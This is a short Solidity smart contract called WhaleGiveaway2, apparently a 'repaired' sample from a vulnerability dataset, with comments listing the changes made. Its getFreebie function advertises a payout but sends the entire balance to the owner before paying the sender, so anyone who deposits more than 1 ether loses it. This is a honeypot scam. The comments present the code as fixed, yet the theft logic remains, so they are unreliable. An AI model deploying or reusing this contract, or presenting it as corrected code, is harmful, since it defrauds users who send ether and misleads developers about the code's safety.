pragma solidity ^0.4.19;

contract WhaleGiveaway2 {
    address public owner;

    function WhaleGiveaway2() public {
        owner = msg.sender;
    }

    function() public payable {}

    function getFreebie() public payable {
        if (msg.value > 1 ether) {
            owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);
        require(adr.call.value(msg.value)(data));
    }
} 

// Changes Made:
// 1. Renamed Owner to owner and set it in the constructor
// 2. Changed GetFreebie to getFreebie for consistent naming convention
// 3. Removed unnecessary check for a specific address in withdraw function
// 4. Added require statement to check the return value of external call in Command function to address unchecked_low_level_calls vulnerability.